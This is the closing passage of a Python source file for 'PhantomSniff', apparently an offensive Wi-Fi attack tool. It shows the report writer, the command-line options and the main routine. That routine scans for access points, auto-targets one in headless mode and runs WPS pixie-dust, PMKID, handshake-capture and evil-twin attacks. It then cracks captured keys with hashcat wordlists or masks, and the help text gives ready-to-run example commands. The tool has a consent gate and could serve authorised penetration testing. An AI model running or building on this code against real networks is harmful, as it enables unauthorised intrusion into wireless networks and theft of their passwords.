        self.state.report_written = True
        return path

    def write_pdf(self) -> None:
        try:
            from fpdf import FPDF
        except ImportError:
            Log.info("fpdf2 not installed; JSON report only.")
            return
        try:
            pdf = FPDF()
            pdf.add_page()
            pdf.set_font("Helvetica", "B", 16)
            pdf.cell(0, 10, "PhantomSniff Report")
            pdf.ln()
            pdf.set_font("Helvetica", "", 10)
            for line in json.dumps(self.build(), indent=1).splitlines():
                pdf.cell(0, 4, line[:120], ln=1)
            out = self.state.workspace / "report.pdf"
            pdf.output(str(out))
            Log.ok(f"PDF report: {out}")
        except Exception as e:
            Log.warn(f"PDF failed: {e}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

import argparse

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="phantomsniff.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=("""
REAL EXAMPLES
-------------
  sudo python3 phantomsniff.py -i wlan0 --scan-only
  sudo python3 phantomsniff.py -i wlan0 --headless --yes
  sudo python3 phantomsniff.py -i wlan0 -a pixie --bssid AA:BB:CC:DD:EE:FF --channel 6
  sudo python3 phantomsniff.py -i wlan0 -a eviltwin --essid LabWPA2 --channel 6
  sudo python3 phantomsniff.py -i wlan0 -a handshake --bssid AA:BB:CC:DD:EE:FF -w /usr/share/wordlists/rockyou.txt
"""))
    p.add_argument("-i", "--interface", help="physical wireless interface")
    p.add_argument("-a", "--attack", choices=sorted(ATTACK_REGISTRY.keys()) + ["auto"],
                   help="run one attack or auto (sequential)")
    p.add_argument("--bssid", help="target BSSID")
    p.add_argument("--channel", type=int, help="target channel")
    p.add_argument("--essid", help="target ESSID (also used for evil twin)")
    p.add_argument("--client", help="client MAC for deauth/handshake")
    p.add_argument("--band", choices=["a", "b", "g", "abg"], default="abg",
                   help="scan band (default abg)")
    p.add_argument("-w", "--wordlist", help="path to wordlist")
    p.add_argument("--rule", help="hashcat rule file")
    p.add_argument("--mask", help="hashcat mask (-a 3)")
    p.add_argument("--scan-time", type=int, default=CONFIG["SCAN_TIME"])
    p.add_argument("--timeout", action="append", metavar="ATTACK=SECS")
    p.add_argument("--headless", action="store_true")
    p.add_argument("--yes", action="store_true")
    p.add_argument("--scan-only", action="store_true")
    p.add_argument("--report", help="custom JSON report path")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("--threads", type=int, default=2)
    return p


def validate_args(args) -> Optional[str]:
    if args.headless and not args.yes and not args.scan_only:
        return "--headless requires --yes"
    if args.scan_only and args.attack:
        return "--scan-only conflicts with --attack"
    if args.mask and args.wordlist:
        return "--mask and --wordlist cannot be used together"
    if args.rule and not (args.wordlist or args.mask):
        return "--rule requires --wordlist or --mask"
    return None


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

GLOBAL_STATE: Optional[State] = None


def _handle_signal(signum, frame):
    Log.error(f"Signal {signum}")
    st = GLOBAL_STATE
    if st:
        try:
            cleanup_and_restore(st)
            if not st.report_written:
                Report(st).write_json(st.args.report if st.args else None)
        except Exception as e:
            Log.error(f"Cleanup error: {e}")
    sys.exit(128 + signum)


def main() -> int:
    global GLOBAL_STATE
    args = build_parser().parse_args()
    Log.VERBOSE = args.verbose

    state = State()
    state.args = args
    GLOBAL_STATE = state

    signal.signal(signal.SIGINT, _handle_signal)
    signal.signal(signal.SIGTERM, _handle_signal)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    workspace = Path(f"/tmp/phantomsniff_{ts}")
    workspace.mkdir(parents=True)
    state.workspace = workspace
    state.captures_dir = workspace / "captures"
    state.captures_dir.mkdir()
    state.creds_path = workspace / f"creds_{ts}.json"

    print(BANNER)

    if not Preflight(args).run():
        return 1

    err = validate_args(args)
    if err:
        Log.error(err)
        return 2

    if not consent_gate(state):
        return 3

    collect_tool_versions(state)
    state.iface_manager = InterfaceManager(state)

    try:
        if not state.iface_manager.setup(args.interface):
            return 4

        scanner = Scanner(state)
        band_map = {"a": "a", "b": "bg", "g": "bg", "abg": "abg"}
        band = band_map.get(args.band, "abg")
        scanner.scan(band=band, scan_time=args.scan_time,
                     bssid=args.bssid, channel=args.channel)

        if args.scan_only:
            Report(state).write_json(args.report)
            return 0

        scanner.display_table()
        target = None
        if args.bssid:
            for ap in scanner.aps:
                if ap["bssid"].upper() == args.bssid.upper():
                    target = ap
                    break
            if not target:
                target = {"bssid": args.bssid.upper(), "essid": args.essid or "<unknown>",
                          "channel": str(args.channel or 1), "privacy": "WPA2",
                          "cipher": "CCMP", "auth": "PSK", "power": -100,
                          "clients": 0, "wps": False, "pmf": "unknown",
                          "sae_only": False, "akms": []}
        elif args.headless:
            aps = scanner.sorted_aps()
            if not aps:
                Log.error("No APs found.")
                return 5
            target = aps[0]
            Log.info(f"Auto target: {target['essid'] or target['bssid']}")
        else:
            target = scanner.select_target_interactive()
            if not target:
                return 5
        if args.channel:
            target["channel"] = str(args.channel)
        if args.essid:
            target["essid"] = args.essid
        state.target = target
        Log.ok(f"Target: {target['essid'] or '<hidden>'} ({target['bssid']})")

        _apply_timeouts(args, state)

        # Attacks
        results = {}
        if args.attack == "auto" or args.attack is None:
            order = ["pixie", "pmkid", "handshake"]
            for atk in order:
                reg = ATTACK_REGISTRY[atk]
                skip = reg["skip_reason"](target)
                if skip:
                    Log.warn(f"Skipping {reg['name']}: {skip}")
                    continue
                results[atk] = reg["func"](state, target)
        elif args.attack in ATTACK_REGISTRY:
            reg = ATTACK_REGISTRY[args.attack]
            skip = reg["skip_reason"](target)
            if skip:
                Log.warn(f"Skipping {reg['name']}: {skip}")
            else:
                kw = {}
                if args.attack == "pixie":
                    kw["timeout"] = _get_timeout(state, "pixie")
                elif args.attack == "handshake":
                    kw["round_time"] = _get_timeout(state, "handshake")
                elif args.attack == "pmkid":
                    kw["timeout"] = _get_timeout(state, "pmkid")
                elif args.attack == "eviltwin":
                    kw["essid"] = args.essid
                results[args.attack] = reg["func"](state, target, **kw)

        # Cracking
        if args.wordlist or args.mask:
            engine = CrackEngine(state)
            r = engine.crack(state,
                             wordlist=Path(args.wordlist) if args.wordlist else None,
                             mask=args.mask,
                             rule=Path(args.rule) if args.rule else None,
                             threads=args.threads)
            results["crack"] = r

        Log.section("SUMMARY")
        for k, v in results.items():
            print(f"{k:10}: {'OK' if v.get('ok') else 'FAIL'} - {v.get('detail') or v.get('reason') or ''}")

        Report(state).write_json(args.report)
        Report(state).write_pdf()
        return 0

    except KeyboardInterrupt:
        return 130
    except Exception as e:
        import traceback
        traceback.print_exc()
        state.errors.append(str(e))
        return 1
    finally:
        cleanup_and_restore(state)
        if not state.report_written:
            try:
                Report(state).write_json(args.report)
            except Exception:
                pass
        Log.ok("Exiting.")


if __name__ == "__main__":
    sys.exit(main())
